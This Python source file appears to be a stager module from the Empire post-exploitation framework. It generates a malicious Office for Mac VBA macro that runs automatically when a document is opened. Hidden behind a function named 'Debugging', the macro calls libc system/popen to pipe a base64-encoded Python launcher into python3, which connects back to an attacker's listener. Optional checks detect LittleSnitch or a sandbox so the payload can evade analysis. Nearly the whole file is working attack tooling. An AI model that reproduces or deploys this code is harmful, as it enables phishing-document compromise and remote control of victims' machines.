import re

from empire.server.common import helpers


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "AppleScript",
            "Authors": [
                {
                    "Name": "Will Schroeder",
                    "Handle": "@harmj0y",
                    "Link": "https://twitter.com/harmj0y",
                },
                {
                    "Name": "",
                    "Handle": "@dchrastil",
                    "Link": "",
                },
                {
                    "Name": "",
                    "Handle": "@DisK0nn3cT",
                    "Link": "",
                },
                {
                    "Name": "",
                    "Handle": "@import-au",
                    "Link": "",
                },
            ],
            "Description": "An OSX office macro that supports newer versions of Office.",
            "Comments": [
                "http://stackoverflow.com/questions/6136798/vba-shell-function-in-office-2011-for-mac"
            ],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "python",
                "SuggestedValues": ["python"],
                "Strict": True,
            },
            "OutFile": {
                "Description": "File to output AppleScript to, otherwise displayed on the screen.",
                "Required": False,
                "Value": "",
            },
            "SafeChecks": {
                "Description": "Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Version": {
                "Description": 'Version of Office for Mac. Accepts values "old" and "new". Old applies to versions of Office for Mac older than 15.26. New applies to versions of Office for Mac 15.26 and newer. Defaults to new.',
                "Required": True,
                "Value": "new",
                "SuggestedValues": ["new", "old"],
                "Strict": True,
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

    def generate(self):
        def formStr(varstr, instr):
            holder = []
            str1 = ""
            str2 = ""
            str1 = varstr + ' = "' + instr[:54] + '"'
            for i in range(54, len(instr), 48):
                holder.append(
                    "\t\t" + varstr + " = " + varstr + ' + "' + instr[i : i + 48]
                )
                str2 = '"\r\n'.join(holder)
            str2 = str2 + '"'
            return str1 + "\r\n" + str2

        # extract all of our options
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        safe_checks = self.options["SafeChecks"]["Value"]
        version = self.options["Version"]["Value"]

        try:
            version = str(version).lower()
        except TypeError as e:
            raise TypeError('Invalid version provided. Accepts "new" and "old"') from e

        # generate the python launcher code
        pylauncher = self.mainMenu.stagergenv2.generate_launcher(
            listener_name,
            language="python",
            encode=True,
            user_agent=user_agent,
            safe_checks=safe_checks,
        )

        if pylauncher == "":
            print(helpers.color("[!] Error in python launcher command generation."))
            return ""

        # render python launcher into python payload
        pylauncher = pylauncher.replace('"', '""')
        for match in re.findall(r"'(.*?)'", pylauncher, re.DOTALL):
            payload = formStr("cmd", match)

            if version == "old":
                macro = f"""
        #If VBA7 Then
            Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
        #Else
            Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
        #End If

        Sub Auto_Open()
            'MsgBox("Auto_Open()")
            Debugging
        End Sub

        Sub Document_Open()
            'MsgBox("Document_Open()")
            Debugging
        End Sub

        Public Function Debugging() As Variant
            On Error Resume Next
                    #If Mac Then
                            Dim result As Long
                            Dim cmd As String
                            {payload}
                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &")
                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &")
                    #End If
        End Function"""
            elif version == "new":
                macro = f"""
        Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String, ByVal mode As String) as LongPtr

        Sub Auto_Open()
            'MsgBox("Auto_Open()")
            Debugging
        End Sub

        Sub Document_Open()
            'MsgBox("Document_Open()")
            Debugging
        End Sub

        Public Function Debugging() As Variant
            On Error Resume Next
                    #If Mac Then
                            Dim result As LongPtr
                            Dim cmd As String
                            {payload}
                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &")
                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &", "r")
                    #End If
        End Function"""
            else:
                raise ValueError('Invalid version provided. Accepts "new" and "old"')

        return macro
